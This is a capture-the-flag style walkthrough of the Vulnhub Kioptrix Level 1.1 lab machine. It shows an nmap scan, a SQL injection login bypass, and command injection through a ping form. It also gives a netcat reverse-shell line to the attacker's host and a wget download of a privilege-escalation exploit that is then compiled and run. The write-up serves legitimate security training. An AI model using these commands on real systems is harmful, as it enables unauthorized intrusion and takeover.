---
title: 'Vulnhub: Kioptrix Level 1.1(#2) - Walkthrough'
date: '2019-06-06T21:18:20+05:30'
draft: false
categories:
  - walkthrough
autoThumbnailImage: false
---


Kioptrix 2, the successor of one of the most popular vulnerable machines available online used for OSCP training, can be found here[ https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)

Upon opening in the VMware, the machine looks like this 

![null](/images/uploads/b-1-.png)

Then I’ll discover the IP address of the target machine using the command

`arp-scan –l`

![null](/images/uploads/b-2-.png)

Then I did port scanning of the target machine to check for open ports and services running on them

`nmap –A –Pn 192.168.192.133`

The complete result was as follows with the ports and services running highlighted:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2019-06-06 04:39 EDT
Nmap scan report for 192.168.192.133
Host is up (0.0010s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            839/udp  status
|_  100024  1            842/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2019-06-06T05:30:31+00:00; -3h09m48s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:12:E2:C6 (VMware)
Device type: general purpose|media device
Running: Linux 2.6.X, Star Track embedded
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:2.6.23 cpe:/h:star_track:srt2014hd
OS details: Linux 2.6.9 - 2.6.30, Star Track SRT2014HD satellite receiver (Linux 2.6.23)
Network Distance: 1 hop
Host script results:
|_clock-skew: mean: -3h09m48s, deviation: 0s, median: -3h09m48s
TRACEROUTE
HOP RTT     ADDRESS
1   1.03 ms 192.168.192.133
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.17 seconds
```

Now after this I tried using SSH for login, but couldn’t succeed. _**IPP on port 631 with CUPS 1.1**_ was my next target to try on, so I spent a good amount of time trying its exploits, but nothing really seemed to work. Then I also tried _**remote login on MySQL**_ but it didn’t work either. Now I came to the _**port 80, for HTTP**_. The following is the webapp hosted on the target machine.

![null](/images/uploads/b-3-.png)

This opened up a login, so first things first, I tried SQL Injection 

![null](/images/uploads/b-4-.png)

And it actually worked, this opened the following page

![null](/images/uploads/b-5-.png)

Now I tried pinging my own IP address, which worked and the next thing which striked in my mind was trying command execution using the same prompt box we entered the IP address in, I start with a simple _**pwd**_ command

`<IP address to ping>;<linux command to execute along>`

![null](/images/uploads/b-6-.png)

Now I start a netcat listener on my machine, using the command

`nc –nlvp <any available port>`

![null](/images/uploads/b-7-.png)

Now to get terminal access of the target machine on mine, I use the following command taking advantage of the command execution vulnerability I previously found.

`<any IP to ping>;/usr/local/bin/nc <Kali’s IP> <Port number on which listener is on> -e '/bin/bash'`

![null](/images/uploads/b-8-.png)

After executing this command, we’ll see a connection is established on our listener

Now we got the terminal access, but to get a command line interface, I used the command

`python –c “import pty;pty.spawn(‘/bin/bash/)”`

![null](/images/uploads/b-9-.png)

Now that I have a directory access, I tried playing in the directories for a while and used normal commands to learn more about the machines and files stored on it, some of these commands are below.

![null](/images/uploads/b-10-.png)

Now that I had user access and I surfed around the directories a little, I found writable file permissions for the folder _**/tmp **_which could be used for using a privilege escalation exploit compiling it and running it, which is exactly what I did.

Now I used two commands to make me aware of the Linux Kernel version and the OS release.

`cat /etc/*-release`	(OS Release)

`uname –r`			(Linux Kernel Version)

![null](/images/uploads/b-11-.png)

Using this exploit, I used the _**searchsploit **_tool in Kali to find a Privilege Escalation exploit.

![null](/images/uploads/b-12-.png)

Now that I found exactly one exploit, I could try using it on the machine. To download it onto the target machine, I will make use of the remote netcat terminal I created but first I’ll need to create a server from Kali hosting that exploit file I just found. For this I used the following commands

`searchsploit –m <exploit file name with extension>`		(copies the file to the working dir)

![null](/images/uploads/b-13-.png)

`python –m SimpleHTTPServer`			(starts a server in the same directory)

![null](/images/uploads/b-14-.png)

Now that this is done, I headed to the /tmp folder where writing and creating files is allowed for a normal user too, and download the exploit from the server I just created using the commands

`cd /tmp`

`wget <Kali’s IP address>:<port number of server>/<filename to be downloaded>`

![null](/images/uploads/b-15-.png)

After the exploit is downloaded, I now need to compile it and execute it.

`gcc –o <executable output exploit name> <exploit file name>`	(to compile)

`./<executable file name>`

![null](/images/uploads/b-16-.png)

And upon the sight of “#” I knew that I’ve successfully escalated the privilege to root access.

To confirm it, I further used the commands “`whoami`” and “`id`”

![null](/images/uploads/b-17-.png)

Congratulations, we have successfully completed the walk-through, I hope you enjoyed it, regarding any doubts, I can be contacted via the contact information available on the blog.

Best Regards,

Adhyan Dhull
